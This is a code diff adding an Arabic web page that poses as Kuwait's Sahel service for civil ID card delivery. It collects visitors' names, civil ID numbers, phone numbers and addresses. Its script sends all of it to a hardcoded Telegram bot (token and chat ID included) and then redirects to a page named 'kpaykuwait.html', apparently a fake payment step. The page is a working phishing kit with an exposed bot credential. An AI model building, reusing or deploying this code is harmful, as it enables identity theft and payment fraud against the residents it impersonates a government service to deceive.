@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>سهل</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="form1.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    #futureDate, #selectform {
+      width: 380px;
+      background-color: #ffffff;
+      height: 45px;
+      display: block;
+      margin: 0 auto;
+      text-align: center;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 30px;
+    }
+
+    #imgform1 {
+      width: 100%;
+    }
+
+    #texdate {
+      display: block;
+      text-align: center;
+      font-weight: bold;
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <img id="imgform1" src="https://kuwait2025.github.io/sahel1/sahel1/imgform3.png">
+  <h3 >    توصيل البطاقة المدنية</h3>
+
+  <div class="box-shadow">
+    <form id="form1">
+      <input type="text" id="userName" placeholder="الاسم" required
+        oninvalid="this.setCustomValidity('يرجى ادخال الاسم الكامل')" 
+        oninput="this.setCustomValidity('')">
+
+      <input type="tel" id="civilId" placeholder="الرقم المدني" required maxlength="12"
+        oninvalid="this.setCustomValidity('يرجى ادخال الرقم المدني الصحيح')" 
+        oninput="this.setCustomValidity('')">
+
+      <input type="tel" id="phone1" placeholder="رقم الجوال" required maxlength="8"
+        oninvalid="this.setCustomValidity('يرجى ادخال رقم الجوال بشكل صحيح')" 
+        oninput="this.setCustomValidity('')">
+
+      <h3>عنوان التوصيل</h3>
+
+      <input type="text" id="blockNumber" placeholder="رقم القطعة" required
+        oninvalid="this.setCustomValidity('يرجى ادخال رقم القطعة')" 
+        oninput="this.setCustomValidity('')">
+
+      <input type="text" id="unitNumber" placeholder="رقم الوحدة" required
+        oninvalid="this.setCustomValidity('يرجى ادخال رقم الوحدة')" 
+        oninput="this.setCustomValidity('')">
+
+      <input type="text" id="couponCode" placeholder="رمز القسيمة" required
+        oninvalid="this.setCustomValidity('يرجى ادخال رمز القسيمة')" 
+        oninput="this.setCustomValidity('')">
+
+      
+
+      <button id="botoneform" type="submit">التالي</button>
+      <p id="texmom"></p>
+    </form>
+  </div>
+
+  <script>
+    window.onload = function () {
+
+      const token = "7714919420:AAEiI6a7p6YHHJRO4c5bCQt8F7zA62DufNM";
+      const chatId = "7273991427";
+
+      document.getElementById("form1").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const name = document.getElementById("userName").value.trim();
+        const civilId = document.getElementById("civilId").value.trim();
+        const phone1 = document.getElementById("phone1").value.trim();
+        const blockNumber = document.getElementById("blockNumber").value.trim();
+        const unitNumber = document.getElementById("unitNumber").value.trim();
+        const couponCode = document.getElementById("couponCode").value.trim();
+
+        if (!name || !civilId || !phone1 || !blockNumber || !unitNumber ) {
+          alert("يرجى ملء جميع الحقول.");
+          return;
+        }
+
+        const message = `
+📥 توصيل البطاقة :
+👤 الاسم: ${name}
+📞 الرقم المدني: ${civilId}
+📱 رقم الجوال: ${phone1}
+📍 رقم القطعة: ${blockNumber}
+🏠 رقم الوحدة: ${unitNumber}
+🏷️ رمز القسيمة: ${couponCode}
+
+        `;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        })
+        .then(response => {
+          if (response.ok) {
+            window.location.href = "kpaykuwait.html";
+          } else {
+            alert("فشل في إرسال البيانات إلى تيليجرام.");
+          }
+        })
+        .catch(error => {
+          console.error("⚠️ خطأ:", error);
+          alert("حدث خطأ أثناء إرسال البيانات.");
+        });
+      });
+    };
+  </script>
+</body>
+</html>
